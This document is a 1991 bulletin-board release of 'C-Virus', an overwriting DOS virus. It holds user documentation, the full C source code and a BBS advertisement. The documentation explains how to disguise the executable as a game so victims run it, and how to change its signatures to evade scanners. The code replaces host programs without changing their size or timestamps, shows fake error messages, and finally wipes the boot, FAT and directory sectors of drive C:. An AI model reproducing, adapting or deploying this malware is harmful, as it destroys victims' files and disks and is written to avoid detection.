

                          Documentation for C-Virus
                         ---------------------------


I. How to use

     To use C-Virus, merely rename it to some innocent (or not-so-innocent)
sounding file name, such as ULTIMA7.EXE, GIFVIEW.COM, or HOTSEX.EXE.  Then
let someone run it.  It's that simple.  Just make sure that its extension is
.EXE or .COM.
      A better choice is to replace any .EXE or .COM file (or, if you really
wanted to, any file) with C-Virus.  At the DOS prompt type "CVIRUS (filename)"
where filename is the name of the victim.  C-Virus will only spread to that
file, not harming any other file in the directory. For example, you could
type "CVIRUS WC2.EXE" and although WC2.EXE would appear unchanged, it is now
actually another copy of C-Virus.  Then feel free to show "Wing Commander II"
to all your friends (on their computers, of course).  Be sure to backup the
file if you want to keep it, as CVIRUS will totally obliterate it.


II.  Modifying C-Virus

     C-Virus was written in Borland's Turbo C++ v1.00, but will also compile
under Turbo C v2.00, and should port to other IBM-PC C compilers with little
modification.
     A good area for modification is the function hostile_activity(). This
function is automatically called if there are no files left to infect.  The
current version of C-Virus has this function overwrite the victim's C:'s boot,
FAT, and directory sectors with garbage, the warm reboot so the chump can
experience the horror of DOS telling him his hard disk is screwed - permanently.
You may want to add to this a few select calls to abswrite(), unlink(), and
biosdisk(), or write your own, more devious routines.
     Other good expansions of C-Virus include adding support for multiple-
directory spreads (something I avoided because it would take up too much space);
changing the code so that C-Virus only goes off on certain days, weeks, etc.;
adding memory-resident support; or, for the truly ambitious, adding specific
COMMAND.COM "support" <hehehe>.  Simple modifications to C-Virus can easily
create viruses just as good as the "professionals'."
     Note:  Try to avoid using printf() or related functions; they can increase
the size of C-Virus dramatically.  Instead use the function puts() or, better
yet, use the _write() command, but this is harder to use. In addition, note
that TOO_SMALL is left defined at a 4.8k.  If, when recompiling C-Virus, you
see that the final product is larger or smaller, change TOO_SMALL to a little
over the size of the .EXE file.  This insures maximum effect without alerting
people via increase in file size.  If this number is too small, subsequent
infections will crash because all of the virus code won't be copied.


III.  Recompiling C-Virus

     To re-compile C-Virus, use the included batch file MAKEVIR.BAT.  This
file assumes that you:  (1) Have LZEXE.EXE, and that it's in your path; (2) 
DEBUG is also in your path; and (3) That MAKEVIR.SCR is in the current
directory.  If any of these things are different on your computer, change the
batch file accordingly.  If you add "-D" to the command line after MAKEVIR,
debug mode will automatically be activated.  If you use a compiler other than
Turbo C++ or Turbo C, you'll have to change the name of the compiler, as well
as the options it is invoked with.
     A note about the "NMAN" signature:  When creating new versions of C-Virus,
I suggest changing the signature to something else.  IT MUST BE FOUR BYTES
LONG.  Change MAKEVIR.SCR so the second line reads "DB '(four bytes)'."  Also
change the definition of SIGNATURE in the C source code.  I would appreciate
that any modified versions do not read "NMAN" - use some other bytes.  These
bytes not only insure that there is a signature so that files aren't
re-infected, but they also stop people from UNLZEXEing you virus for analysis
(of course they could always change them back, but most people are too stupid
to think of this).


IV.  Removing C-Virus

     DO NOT accidentally infect yourself.  Infected files are unrecoverable. 
If you infect your files, the only way to get rid of the virus is to erase
them.  Don't say you weren't warned.
     By the way, no virus-scanner that I know of can identify C-Virus.  Of
course, it's only a matter of time, so be sure to change the signature, the
screw_virex[] array, and the code frequently.  Nothing can remove C-Virus
either.  Oh well.

     If you have any questions, suggestions, or complaints, you can leave E-Mail
for me at the Pirate's Guild BBS (1-708-541-1069).


                               Happy virusing!

                                -Nowhere Man/* C-Virus:  A generic .COM and .EXE infector
   Written by Nowhere Man
   September 23, 1991
   Version 2.0
*/

#include <dir.h>
#include <dos.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>


/* Note that the #define TOO_SMALL is the minimum size of the .EXE or .COM
   file which CVIRUS can infect without increasing the size of the file.
   (Since this would tip off the victim to CVIRUS's presence, no file under
   this size will be infected.)  It should be set to the approximate size
   of the LZEXEd .EXE file produced from this code.

   SIGNATURE is the four-byte signature that CVIRUS checks for to prevent
   re-infection of itself.
*/

#ifdef DEBUG
#define TOO_SMALL 6100
#else
#define TOO_SMALL 4900
#endif

#define SIGNATURE "NMAN"


/* The following is a table of random byte values.  Be sure to constantly
   change this to prevent detection by virus scanners, but keep it short
   (or non-exsistant) to keep the code size down.
*/

char screw_virex[] = "\xFF\x17\x12\x39\x54\xFA\x23\xBC\xCD\xAD";

void hostile_activity(void)
{
	/* Put whatever you feel like doing here...
	   I chose to make this routine trash the victim's boot, FAT, and
	   directory sectors, but you can alter this code however you want,
	   and are encouraged to do so.
	*/


#ifdef DEBUG
	puts("\aAll files infected!");
	exit(1);
#else
	/* Overwrite five sectors, starting with sector 0, on C:, with the
	   memory at location DS:0000 (random garbage).
	*/

	abswrite(2, 5, 0, (void *) 0);
	__emit__(0xCD, 0x19);	// Reboot computer
#endif
}

int infected(char *fname)
{
	/* This function determines if fname is infected.  It reads four
	   bytes 28 bytes in from the start and checks them agains the
	   current header.  1 is returned if the file is already infected,
	   0 if it isn't.
	*/

	register int handle;
	char virus_signature[35];
	static char check[] = SIGNATURE;

	handle = _open(fname, O_RDONLY);
	_read(handle, virus_signature, sizeof(virus_signature));
	close(handle);

#ifdef DEBUG
	printf("Signature for %s:  %.4s\n", fname, &virus_signature[28]);
#endif

	/* This next bit may look really stupid, but it actually saves about
	   100 bytes.
	*/

	return((virus_signature[28] == check[0]) && (virus_signature[29] == check[1])
	       && (virus_signature[30] == check[2]) && (virus_signature[31] == check[3]));
}

void spread(char *virus, char *victim)
{
	/* This function infects victim with virus.  First, the file
	   sizes of the two files are determined.  Then the victim's
	   attributes and file date/time are read and the victim is closed,
	   its attributes set to 0, and deleted.  Then the virus is copied
	   to the victim's file name.  Its attributes, file date/time, and
	   size are set to that of the victim's, preventing detection, and
	   the files are closed.
	*/

	register int virus_handle, victim_handle, attrib;
	struct ftime victim_file_time;
	unsigned virus_size;
	long victim_size;
	char virus_code[TOO_SMALL + 1];

#ifdef DEBUG
	printf("Infecting %s with %s...\n", victim, virus);
#endif

	/* Open files */

	virus_handle = _open(virus, O_RDONLY);
	victim_handle = _open(victim, O_RDONLY);


	/* Get the actual size of the virus */

	virus_size = filelength(virus_handle);


	/* Get victim's attributes */

	victim_size = filelength(victim_handle);
	attrib = _chmod(victim, 0);
	getftime(victim_handle, &victim_file_time);


	/* Eliminate victim */

	close(victim_handle);
	_chmod(victim, 1, 0);
	remove(victim);


#ifdef DEBUG
	puts("Ok so far...");
#endif

	/* Recreate the victim */

	victim_handle = _creat(victim, attrib);


	/* Copy virus */

	_read(virus_handle, virus_code, virus_size);
	_write(victim_handle, virus_code, virus_size);


#ifdef DEBUG
	puts("Almost done...");
#endif

	/* Reset victim's file date, time, and size */

	chsize(victim_handle, victim_size);
	setftime(victim_handle, &victim_file_time);


	/* Close files */

	close(virus_handle);
	close(victim_handle);

#ifdef DEBUG
	puts("Infection complete!");
#endif
}

char *victim(void)
{
	/* This function returns a pointer to the name of the virus's next
	   victim.  This routine is set up to try to infect .EXE and .COM
	   files.  If there is a command line argument, it will try to infect
	   that file instead.  If all files are infected, hostile activity
	   is initiated...
	*/

	register int done;
	register char **ext;
	static char *types[] = {"*.EXE", "*.COM", NULL};
	static struct ffblk ffblk;

	for (ext = (*++_argv) ? _argv : types; *ext; ext++) {
		done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH);
		while (!done) {

#ifdef DEBUG
			printf("Scanning %s...\n", ffblk.ff_name);
#endif

	/* If you want to check for specific days of the week, months, etc.,
	   here is the place to insert the code (don't forget to "#include
	   <time.h>").
	*/

			if ((!infected(ffblk.ff_name)) && (ffblk.ff_fsize > TOO_SMALL))
				return(ffblk.ff_name);
			done = findnext(&ffblk);
		}
	}


	/* If there are no files left to infect, have a little fun */

	hostile_activity();
}

int main(void)
{
	/* In the main program, a victim is found and infected.  If all files
	   are infected, a malicious action is performed.  Otherwise, a bogus
	   error message is displayed, and the virus terminates with code
	   1, simulating an error.
	*/

	static char *err_msg[] = {"Out of memory", "Bad EXE format",
				  "Invalid DOS version", "Bad memory block",
				  "FCB creation error", "Sharing violation",
				  "Abnormal program termination",
				  "Divide error"
				 };
	register char *virus_name = *_argv;

	spread(virus_name, victim());
	puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);
	return(1);
}



                  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
                  º          The Hell Pit BBS              º
                  º              1200/2400                 º
                  º Sysops:    Operating At    Permanent   º
                  º  HADES       4,500,000ø     suntans    º
                  º  K’TO                      available   º
                  º       °    (708)459-7267               º
                  º      °±°                   °          °º
                  º °   °±²±°      °          °²         °°º
                  º±   °±±²²±°      ±        °²±°       °±²º
                  º°± °±±²²±±±°   °±²°     °±±²²±°     °±²²º
                  º° °±±±²²²±±±° ±±²²²±°   ±±²²²²±°   °±²²²º
                  º°°±±±²²²²²±±±°±²²²²²±° °±²²²²²²±° °±²²²²º
                  º°±±²²²²²²²²²²²²²²²²²²²±²²²²²²²²²²²²²²²²²º
                  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                            We want your viruses!





A 11C
DB "NMAN"

W
Q

</time.h></stdio.h></io.h></fcntl.h></dos.h></dir.h></hehehe>